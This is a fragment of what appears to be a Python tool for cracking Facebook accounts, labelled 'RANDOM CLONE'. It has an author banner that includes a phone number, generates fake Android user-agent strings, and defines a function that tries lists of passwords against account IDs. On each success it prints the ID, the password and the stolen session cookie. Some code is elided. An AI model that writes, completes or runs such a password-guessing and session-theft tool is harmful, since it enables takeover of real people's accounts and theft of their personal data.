...
██   ██ ███████ ██   ██ ██   ██ ██   ██ ██
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [🔰]AUTHOR    \033[1;32m: \033[1;92m亗Ashraful࿐              ┃
 ┃ [🔰]TOOL      \033[1;32m: \033[1;92mRANDOM CLONE               ┃
 ┃ [🔰]STATUS    \033[1;32m: \033[1;92mFREE                       ┃
 ┃ [🔰]SYSTEM    \033[1;32m: \033[1;92mDATA ÷ WIFI                ┃
 ┃ [🔰]GITHUB    \033[1;32m: \033[1;92m亗Ashraful™DADU࿐           ┃
 ┃ [🔰]FACEBOOK  \033[1;32m: \033[1;92m亗Ashraful࿐              ┃
 ┃ [🔰]WHATSAPP  \033[1;32m: \033[1;92+8801753-966657         ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
...
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0'
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[亗Ashraful࿐  ]\033[1;92m%s\033[m\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;32m[亗Ashraful࿐  OK鈩] {uid}|{ps} \nCookie : {coki}")
